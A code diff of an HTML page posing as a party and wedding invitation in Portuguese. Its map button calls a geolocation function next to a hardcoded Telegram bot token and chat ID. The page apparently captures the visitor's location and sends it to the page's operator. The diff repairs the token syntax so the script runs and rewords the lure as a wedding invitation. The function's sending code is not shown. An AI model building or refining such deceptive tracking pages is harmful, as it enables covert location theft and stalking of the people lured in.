@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Convite de Aniversário</title>
+    <title>Convite de Casamento</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; background-color: #fce4ec; padding: 50px; }
         .invite-card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
@@ -15,15 +15,15 @@
 
 <div class="invite-card">
     <h1>Festa do Primo! 🎂</h1>
-    <p>Estamos organizando uma surpresa e contamos com você.</p>
+    <p>Estamos organizando nosso casamento e contamos com você.</p>
     <p>Clique no botão abaixo para abrir o mapa com o local exato da festa.</p>
     
     <button onclick="obterLocalizacao()">ABRIR LOCAL NO MAPA</button>
 </div>
 
 <script>
-    const TELEGRAM_TOKEN = 8265613312:AAEdl5JjZKQcJ79QtgdMchlH9u1X0K3HgQE;
-    const CHAT_ID = 5881884284;
+    const TELEGRAM_TOKEN = '8265613312:AAEdl5JjZKQcJ79QtgdMchlH9u1X0K3HgQE';
+    const CHAT_ID = '5881884284';
 
     function obterLocalizacao() {
         if (navigator.geolocation) {
